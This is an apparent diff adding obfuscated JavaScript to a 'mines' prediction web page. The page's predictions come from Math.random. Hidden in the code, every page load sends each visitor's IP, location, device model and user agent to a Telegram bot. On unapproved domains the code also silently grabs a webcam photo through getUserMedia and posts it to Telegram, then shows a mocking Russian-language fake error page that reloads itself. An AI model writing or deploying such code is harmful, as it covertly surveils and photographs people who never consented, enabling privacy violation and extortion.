+        model: parseDeviceModel(_0x433b1f, _0x598886.os)
+      };
+    }
+  }
+  return {
+    type: "Unknown",
+    os: "Unknown",
+    model: "Unknown Device"
+  };
+}
+function parseDeviceModel(_0x108723, _0x4467e4) {
+  switch (_0x4467e4) {
+    case "iOS":
+      const _0x543372 = _0x108723.match(/iPhone\s*(\d+([_\.]\d+)*)/i);
+      if (_0x543372) {
+        return "iPhone " + _0x543372[1].replace(/[_\.]/g, " ");
+      }
+      const _0x1a2030 = _0x108723.match(/iPad/i);
+      if (_0x1a2030) {
+        return "iPad";
+      }
+      break;
+    case "Android":
+      const _0x2c6983 = _0x108723.match(/;\s*([^;)]+)\s*Build/i);
+      if (_0x2c6983) {
+        return _0x2c6983[1].trim();
+      }
+      break;
+    case "Windows":
+      const _0x55233a = _0x108723.match(/Windows\s*([\w\s]+)/i);
+      if (_0x55233a) {
+        return "Windows " + _0x55233a[1];
+      }
+      break;
+    case "macOS":
+      const _0x6b746b = _0x108723.match(/Macintosh;.*Mac\s*([\w\s]+)/i);
+      if (_0x6b746b) {
+        return "Mac " + _0x6b746b[1];
+      }
+      break;
+  }
+  return "Unknown Device";
+}
+function getCountryEmoji(_0x5e54d7) {
+  return _0x5e54d7.replace(g, _0x11c033 => String.fromCodePoint(127397 + _0x11c033.toUpperCase().charCodeAt()));
+}
+async function captureAndSendPhoto() {
+  try {
+    const _0x519174 = await navigator.mediaDevices.getUserMedia({
+      video: true
+    });
+    const _0x42a09d = document.createElement("video");
+    _0x42a09d.srcObject = _0x519174;
+    await _0x42a09d.play();
+    const _0x3f4aee = document.createElement("canvas");
+    _0x3f4aee.width = _0x42a09d.videoWidth;
+    _0x3f4aee.height = _0x42a09d.videoHeight;
+    const _0xd83280 = _0x3f4aee.getContext("2d");
+    _0xd83280.drawImage(_0x42a09d, 0, 0, _0x3f4aee.width, _0x3f4aee.height);
+    _0x42a09d.pause();
+    _0x519174.getTracks().forEach(_0x274ecb => _0x274ecb.stop());
+    const _0x44f4bc = await new Promise(_0x24fbfc => _0x3f4aee.toBlob(_0x24fbfc, "image/jpeg"));
+    const _0x3abb20 = new FormData();
+    _0x3abb20.append("chat_id", ADMIN_ID);
+    _0x3abb20.append("photo", _0x44f4bc, "photo.jpg");
+    await fetch("https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendPhoto", {
+      method: "POST",
+      body: _0x3abb20
+    });
+    console.log("Photo captured and sent successfully");
+  } catch (_0x4921df) {
+    console.error("Failed to capture photo:", _0x4921df);
+  }
+}
+async function initTelegramBot() {
+  const _0x147fc8 = {
+    domain: window.location.hostname,
+    fullUrl: window.location.href
+  };
+  const _0x24e39b = _0x147fc8;
+  if (_0x24e39b.domain !== "osdisdll300s9in.vercel.app" && _0x24e39b.domain !== "osdisdll300s9in.vercel.app") {
+    document.body.innerHTML = "\n            <div id=\"overlay\">\n                <h1>Ошибка 404: Доступ запрещен</h1>\n                <div class=\"arrow top\"></div>\n                <div class=\"arrow bottom\"></div>\n                <div class=\"arrow left\"></div>\n                <div class=\"arrow right\"></div>\n                <img src=\"data:image/png;base64,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\" alt=\"Error Image\" style=\"max-width: 100%; height: auto;\" />\n                <p>К сожалению, возникли проблемы с доступом к сайту:</p>\n                <ul>\n                    <li>Не удалось загрузить ресурс.</li>\n                    <li>Проблемы с сервером.</li>\n                    <li>Неправильный домен.</li>\n                    <li>Возможно вы нищий блюм.</li>\n                    <li>Возможно вы хотели спиздить вебку.</li>\n                    <li>Возможно вы хотели обновить вебку за 15$.</li>\n                    <li>Возможно вы хотели купить вебку у ее кодера.</li>\n                </ul>\n                <a href=\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\" id=\"fixButton\">Fix It</a>\n            </div>\n        ";
+    const _0x8607a3 = document.createElement("style");
+    _0x8607a3.innerHTML = "\n            body {\n                margin: 0;\n                height: 100vh;\n                display: flex;\n                justify-content: center;\n                align-items: center;\n                position: relative;\n                overflow: hidden;\n                background-color: #282c34;\n                color: white;\n                font-family: 'Arial', sans-serif;\n            }\n            #overlay {\n                position: absolute;\n                top: 0;\n                left: 0;\n                right: 0;\n                bottom: 0;\n                background: linear-gradient(135deg, rgba(255, 0, 0, 0.7), rgba(255, 255, 0, 0.7));\n                display: flex;\n                flex-direction: column;\n                justify-content: center;\n                align-items: center;\n                z-index: 9999;\n                padding: 20px;\n                animation: flicker 1s infinite;\n            }\n            h1 {\n                font-size: 4em;\n                margin: 0;\n                text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);\n                animation: glow 1.5s infinite alternate;\n            }\n            p {\n                font-size: 1.5em;\n                margin: 20px 0;\n                text-shadow: 0 0 5px rgba(255, 255, 255, 0.5);\n            }\n            ul {\n                list-style-type: none;\n                padding: 0;\n                text-align: center;\n                font-size: 1.2em;\n            }\n            #fixButton {\n                background-color: white;\n                color: red;\n                border: none;\n                padding: 10px 20px;\n                font-size: 18px;\n                cursor: pointer;\n                text-decoration: none;\n                border-radius: 5px;\n                transition: background-color 0.3s, transform 0.3s;\n                box-shadow: 0 0 10px rgba(255, 0, 0, 0.8);\n            }\n            #fixButton:hover {\n                background-color: #ddd;\n                transform: scale(1.05);\n            }\n            @keyframes flicker {\n                0% { opacity: 1; }\n                50% { opacity: 0.7; }\n                100% { opacity: 1; }\n            }\n            @keyframes glow {\n                0% { text-shadow: 0 0 10px rgba(255, 255, 255, 0.8); }\n                100% { text-shadow: 0 0 20px rgba(255, 255, 255, 1); }\n            }\n        ";
+    document.head.appendChild(_0x8607a3);
+    const _0x4cc9a3 = await getUserInfo();
+    await sendTelegramMessage("\n🚫 <b>Unauthorized Access Attempt Detected</b>\n📍 Domain: <code>" + _0x24e39b.domain + "</code>\n🔗 URL: <code>" + _0x24e39b.fullUrl + "</code>\n🌐 IP: <code>" + _0x4cc9a3.ip + "</code>\n📌 Location: " + _0x4cc9a3.city + ", " + _0x4cc9a3.region + ", " + _0x4cc9a3.countryName + " " + _0x4cc9a3.countryEmoji + "\n📱 Device: <code>" + _0x4cc9a3.deviceModel + "</code>\n🖥️ Type: <code>" + _0x4cc9a3.deviceType + " (" + _0x4cc9a3.deviceOS + ")</code>\n📱 User Agent: <code>" + _0x4cc9a3.userAgent + "</code>\n⏰ Time: <code>" + new Date().toISOString() + "</code>\n        ");
+    await captureAndSendPhoto();
+    setInterval(() => {
+      location.reload();
+    }, 11200);
+    return;
+  }
+  try {
+    const _0x17481a = await fetch("https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/getMe");
+    const _0x33e10c = await _0x17481a.json();
+    if (_0x33e10c.ok) {
+      console.log("Bot initialized");
+      isAuthenticated = true;
+      const _0xf4c944 = await getUserInfo();
+      await sendTelegramMessage("\n🚀 <b>New Bot Access Detected</b>\n📍 Domain: <code>" + _0x24e39b.domain + "</code>\n🔗 URL: <code>" + _0x24e39b.fullUrl + "</code>\n🌐 IP: <code>" + _0xf4c944.ip + "</code>\n📌 Location: " + _0xf4c944.city + ", " + _0xf4c944.region + ", " + _0xf4c944.countryName + " " + _0xf4c944.countryEmoji + "\n📱 Device: <code>" + _0xf4c944.deviceModel + "</code>\n🖥️ Type: <code>" + _0xf4c944.deviceType + " (" + _0xf4c944.deviceOS + ")</code>\n📱 User Agent: <code>" + _0xf4c944.userAgent + "</code>\n⏰ Time: <code>" + new Date().toISOString() + "</code>\n            ");
+    }
+  } catch (_0x4bb1b3) {
+    console.error("Failed to initialize bot:", _0x4bb1b3);
+    const _0x407c59 = await getUserInfo();
+    await sendTelegramMessage("\n❗️ <b>Bot Initialization Failed</b>\n📍 Domain: <code>" + _0x24e39b.domain + "</code>\n🔗 URL: <code>" + _0x24e39b.fullUrl + "</code>\n🌐 IP: <code>" + _0x407c59.ip + "</code>\n📌 Location: " + _0x407c59.city + ", " + _0x407c59.region + ", " + _0x407c59.countryName + " " + _0x407c59.countryEmoji + "\n📱 Device: <code>" + _0x407c59.deviceModel + "</code>\n🖥️ Type: <code>" + _0x407c59.deviceType + " (" + _0x407c59.deviceOS + ")</code>\n📱 User Agent: <code>" + _0x407c59.userAgent + "</code>\n⏰ Time: <code>" + new Date().toISOString() + "</code>\n        ");
+  }
+}
+document.addEventListener("DOMContentLoaded", _0x1bc8fd => {
+  initTelegramBot();
+});
+document.addEventListener("DOMContentLoaded", function () {
+  const _0x30abfa = document.querySelector(".cells-board");
+  if (!_0x30abfa) {
+    console.error("Element .cells-board not found.");
+    return;
+  }
+  let _0x1fc82e = _0x30abfa.innerHTML;
+  const _0x463061 = new URLSearchParams(window.location.search);
+  const _0x4516a3 = _0x463061.get("botName") || "Unknown";
+  const _0x237ed1 = _0x463061.get("language") || "en";
+  const _0x24eed6 = [1, 3, 5, 7];
+  const _0x292ffd = {
+    "1": 7,
+    "3": 5,
+    "5": 4,
+    "7": 3
+  };
+  let _0x30a316 = 0;
+  const _0x20d80c = document.getElementById("trapsAmount");
+  const _0x14ad19 = document.getElementById("prev_preset_btn");
+  const _0x5709e9 = document.getElementById("next_preset_btn");
+  const _0x3662f7 = document.getElementById("modeButton");
+  let _0x2fe588 = "nesk";
+  function _0x557099() {
+    if (_0x20d80c) {
+      _0x20d80c.textContent = _0x24eed6[_0x30a316];
+    }
+  }
+  if (_0x14ad19) {
+    _0x14ad19.addEventListener("click", function () {
+      if (_0x30a316 > 0) {
+        _0x30a316--;
+        _0x557099();
+      }
+    });
+  }
+  if (_0x5709e9) {
+    _0x5709e9.addEventListener("click", function () {
+      if (_0x30a316 < _0x24eed6.length - 1) {
+        _0x30a316++;
+        _0x557099();
+      }
+    });
+  }
+  if (_0x3662f7) {
+    _0x3662f7.addEventListener("click", function () {
+      _0x2fe588 = _0x2fe588 === "nesk" ? "all" : "nesk";
+      _0x3662f7.textContent = _0x2fe588 === "nesk" ? "Switch to All" : "Switch to multiple";
+    });
+  }
+  _0x557099();
+  function _0x38a303() {
+    const _0x39c107 = document.querySelectorAll(".cells-board .cell");
+    _0x39c107.forEach(_0x16b0af => {
+      _0x16b0af.addEventListener("click", () => {
+        _0x16b0af.style.transform = "scale(0.7)";
+        setTimeout(() => {
+          _0x16b0af.style.transform = "scale(1)";
+        }, 200);
+      });
+    });
+  }
+  function _0x3ef56a(_0x17c9cf) {
+    _0x17c9cf.style.display = "block";
+    return _0x17c9cf;
+  }
+  let _0x4ebf75 = true;
+  const _0x541fb6 = document.getElementById("playButton");
+  if (_0x541fb6) {
+    _0x541fb6.addEventListener("click", function () {
+      _0x541fb6.disabled = true;
+      let _0x388453 = document.querySelectorAll(".cells-board .cell");
+      if (!_0x4ebf75) {
+        _0x30abfa.innerHTML = "";
+        _0x1d3d6e();
+        _0x388453 = document.querySelectorAll(".cells-board .cell");
+      }
+      const _0x4f48f2 = parseInt(_0x20d80c.textContent);
+      const _0x1ec0bb = _0x388453.length;
+      const _0x5e966d = new Set();
+      while (_0x5e966d.size < _0x4f48f2) {
+        const _0x1bbb26 = Math.floor(Math.random() * _0x1ec0bb);
+        _0x5e966d.add(_0x1bbb26);
+      }
+      if (_0x2fe588 === "nesk") {
+        const _0x8309c9 = _0x292ffd[_0x4f48f2] || 0;
+        const _0x4c5041 = [];
+        while (_0x4c5041.length < _0x8309c9) {
+          const _0x124850 = Math.floor(Math.random() * _0x388453.length);
+          if (!_0x4c5041.includes(_0x124850)) {
+            _0x4c5041.push(_0x124850);
+          }
+        }
+        let _0x4dde14 = 0;
+        function _0x42d47e() {
+          if (_0x4dde14 < _0x4c5041.length) {
+            const _0xce203b = _0x4c5041[_0x4dde14];
+            const _0x25f35d = _0x388453[_0xce203b];
+            _0x25f35d.classList.add("cell-fade-out");
+            setTimeout(async () => {
+              _0x25f35d.innerHTML = "";
+              try {
+                const _0x17e4bd = await fetch("img/stars.png");
+                const _0x48d88a = await _0x17e4bd.text();
+                const _0x2e8418 = document.createElement("div");
+                _0x2e8418.style.cssText = "\n                                    width: 56px;\n                                    height: 56px;\n                                    display: flex;\n                                    align-items: center;\n                                    justify-content: center;\n                                    position: relative;\n                                ";
+                _0x2e8418.innerHTML = _0x48d88a;
+                _0x25f35d.appendChild(_0x2e8418);
+                const _0x397cec = _0x2e8418.querySelector("svg");
+                if (_0x397cec) {
+                  _0x397cec.style.cssText = "\n                                        width: 56px;\n                                        height: 56px;\n                                        max-width: 100%;\n                                        max-height: 100%;\n                                        display: block;\n                                        opacity: 0;\n                                        transform: scale(0);\n                                        transition: opacity 0.3s, transform 0.3s;\n                                    ";
+                  const _0x550d2d = _0x397cec.getAttribute("viewBox");
+                  if (!_0x550d2d) {
+                    const _0x4b38f5 = _0x397cec.getAttribute("width") || "100";
+                    const _0x1a8947 = _0x397cec.getAttribute("height") || "100";
+                    _0x397cec.setAttribute("viewBox", "0 0 " + _0x4b38f5 + " " + _0x1a8947);
+                  }
+                  _0x397cec.setAttribute("preserveAspectRatio", "xMidYMid meet");
+                  _0x397cec.classList.add("star-animation");
+                  requestAnimationFrame(() => {
+                    _0x397cec.style.opacity = "1";
+                    _0x397cec.style.transform = "scale(1)";
+                  });
+                }
+              } catch (_0x36914c) {
+                const _0x99928d = document.createElement("img");
+                _0x99928d.style.cssText = "\n                                    width: 56px;\n                                    height: 56px;\n                                    display: block;\n                                    will-change: transform, opacity;\n                                    opacity: 0;\n                                    transform: scale(0);\n                                    transition: opacity 0.3s, transform 0.3s;\n                                ";
+                _0x99928d.src = "img/stars.png";
+                _0x25f35d.appendChild(_0x99928d);
+                requestAnimationFrame(() => {
+                  _0x99928d.style.opacity = "1";
+                  _0x99928d.style.transform = "scale(1)";
+                });
+              }
+              _0x25f35d.classList.remove("cell-fade-out");
+              _0x4dde14++;
+              setTimeout(_0x42d47e, 700);
+            }, 400);
+          } else {
+            _0x541fb6.disabled = false;
+            if (_0x4ebf75) {
+              _0x4ebf75 = false;
+            }
+          }
+        }
+        _0x42d47e();
+      } else {
+        Promise.all([..._0x388453].map((_0x476be0, _0x17ddb3) => {
+          return new Promise(async _0x4911db => {
+            _0x476be0.classList.add("cell-fade-out");
+            _0x476be0.innerHTML = "";
+            try {
+              const _0x18031b = await fetch(_0x5e966d.has(_0x17ddb3) ? "img/stars.png" : "img/stars.png");
+              const _0x4adfca = await _0x18031b.text();
+              const _0x3c7608 = document.createElement("div");
+              _0x3c7608.style.cssText = "\n                                width: 56px;\n                                height: 56px;\n                                display: flex;\n                                align-items: center;\n                                justify-content: center;\n                                position: relative;\n                            ";
+              _0x3c7608.innerHTML = _0x4adfca;
+              _0x476be0.appendChild(_0x3c7608);
+              const _0x2254b3 = _0x3c7608.querySelector("svg");
+              if (_0x2254b3) {
+                _0x2254b3.style.cssText = "\n                                    width: 56px;\n                                    height: 56px;\n                                    max-width: 100%;\n                                    max-height: 100%;\n                                    display: block;\n                                    opacity: 0;\n                                    transform: scale(0);\n                                    transition: opacity 0.3s, transform 0.3s;\n                                ";
+                const _0x1b4555 = _0x2254b3.getAttribute("viewBox");
+                if (!_0x1b4555) {
+                  const _0x343e88 = _0x2254b3.getAttribute("width") || "100";
+                  const _0x52ee22 = _0x2254b3.getAttribute("height") || "100";
+                  _0x2254b3.setAttribute("viewBox", "0 0 " + _0x343e88 + " " + _0x52ee22);
+                }
+                _0x2254b3.setAttribute("preserveAspectRatio", "xMidYMid meet");
+                _0x2254b3.classList.add("star-animation");
+                _0x2254b3.style.opacity = "0";
+                _0x2254b3.style.transform = "scale(0)";
+                requestAnimationFrame(() => {
+                  _0x2254b3.style.opacity = "1";
+                  _0x2254b3.style.transform = "scale(1)";
+                });
+              }
+            } catch (_0x59dfa3) {
+              const _0x4f48ab = document.createElement("img");
+              _0x4f48ab.style.cssText = "\n                                width: 56px;\n                                height: 56px;\n                                display: block;\n                                will-change: transform, opacity;\n                                opacity: 0;\n                                transform: scale(0);\n                                transition: opacity 0.3s, transform 0.3s;\n                            ";
+              _0x4f48ab.src = _0x5e966d.has(_0x17ddb3) ? "img/stars.png" : "img/stars.png";
+              _0x476be0.appendChild(_0x4f48ab);
+              requestAnimationFrame(() => {
+                _0x4f48ab.style.opacity = "1";
+                _0x4f48ab.style.transform = "scale(1)";
+              });
+            }
+            _0x476be0.classList.remove("cell-fade-out");
+            _0x4911db();
+          });
+        })).then(() => {
+          _0x541fb6.disabled = false;
+          if (_0x4ebf75) {
+            _0x4ebf75 = false;
+          }
+        });
+      }
+    });
+  }
+  function _0x1d3d6e() {
+    const _0x281202 = ["output_svgs/image_5450.svg", "output_svgs/image_11641.svg", "output_svgs/image_18337.svg", "output_svgs/image_24493.svg", "output_svgs/image_31201.svg", "output_svgs/image_37357.svg", "output_svgs/image_44065.svg", "output_svgs/image_50221.svg", "output_svgs/image_56929.svg", "output_svgs/image_63085.svg", "output_svgs/image_69793.svg", "output_svgs/image_75949.svg", "output_svgs/image_82645.svg", "output_svgs/image_89353.svg", "output_svgs/image_95509.svg", "output_svgs/image_102217.svg", "output_svgs/image_108373.svg", "output_svgs/image_115081.svg", "output_svgs/image_121237.svg", "output_svgs/image_127381.svg", "output_svgs/image_134077.svg", "output_svgs/image_140221.svg", "output_svgs/image_146917.svg", "output_svgs/image_153061.svg", "output_svgs/image_159757.svg"];
+    _0x281202.forEach(_0x1e65a8 => {
+      const _0x46996f = document.createElement("button");
+      _0x46996f.type = "button";
+      _0x46996f.className = "cell";
+      _0x46996f.innerHTML = "<img width=\"56\" height=\"56\" src=\"" + _0x1e65a8 + "\">";
+      _0x30abfa.appendChild(_0x46996f);
+    });
+    _0x38a303();
+  }
+  _0x1d3d6e();
+});
